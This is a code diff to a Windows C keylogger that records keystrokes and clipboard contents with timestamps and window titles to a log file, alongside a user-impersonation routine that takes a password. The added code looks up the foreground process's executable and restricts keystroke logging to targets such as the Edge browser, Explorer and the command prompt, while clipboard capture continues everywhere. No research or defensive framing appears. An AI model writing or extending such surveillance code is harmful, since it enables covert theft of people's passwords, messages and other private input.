@@ -4,6 +4,8 @@
 #include <time.h>
 #include <shlobj.h>
 #include <string.h>
+#include <psapi.h>
+#pragma comment(lib, "Psapi.lib")
 
 #pragma warning(push)
 #pragma warning(disable : 4820)
@@ -17,7 +19,6 @@
 #define MAX_PATH_LENGTH 260
 char LOG_FILE[MAX_PATH_LENGTH];
 char lastClipboardContent[1024] = "";
-
 void ImpersonateUser(const char* username, const char* domain, const char* password)
 {
     HANDLE hToken;
@@ -59,8 +60,45 @@ void SetLogFilePath(void)
     }
 }
 
+BOOL isApplicationAllowed(char* currentApplication)
+{
+    char* allowedApplications[] = {/*"Notepad.exe",*/ "explorer.exe", "cmd.exe", "msedge.exe"};
+
+    size_t appCount = sizeof(allowedApplications) / sizeof(allowedApplications[0]);
+    for (size_t i = 0; i < appCount; i++)
+    {
+        if (i < appCount && strstr(currentApplication, allowedApplications[i]))
+        {
+            return TRUE;
+        }
+    }
+    return FALSE;
+}
+
+BOOL GetActiveApplication(char* appPath, size_t appPathSize)
+{
+    HWND hwnd = GetForegroundWindow();
+    if (!hwnd) return FALSE;
+
+    DWORD pid;
+    GetWindowThreadProcessId(hwnd, &pid);
+
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+    if (hProcess)
+    {
+        if (GetModuleFileNameEx(hProcess, NULL, appPath, (DWORD)appPathSize))
+        {
+            CloseHandle(hProcess);
+            return TRUE;
+        }
+        CloseHandle(hProcess);
+    }
+    return FALSE;
+}
+
 void LogKeystroke(char* keystroke, BOOL clipboard)
 {
+
     FILE* file = fopen(LOG_FILE, "a");
     if (!file) return;
 
@@ -68,6 +106,12 @@ void LogKeystroke(char* keystroke, BOOL clipboard)
     struct tm* tm_info = localtime(&t);
     char time_str[20];
     strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", tm_info);
+
+    char activeApp[MAX_PATH] = "<unknown>";
+    if (GetActiveApplication(activeApp, sizeof(activeApp)))
+    {
+        if (!isApplicationAllowed(activeApp) && !clipboard) return;
+    }
 
     HWND hwnd = GetForegroundWindow();
     char windowTitle[256];
@@ -81,7 +125,6 @@ void LogKeystroke(char* keystroke, BOOL clipboard)
     {
         fprintf(file, "[%s] - '%s': %s\n", time_str, windowTitle, keystroke);
     }
-    // fprintf(file, "[%s] - '%s': %s\n", time_str, windowTitle, keystroke);
     fclose(file);
 }
 
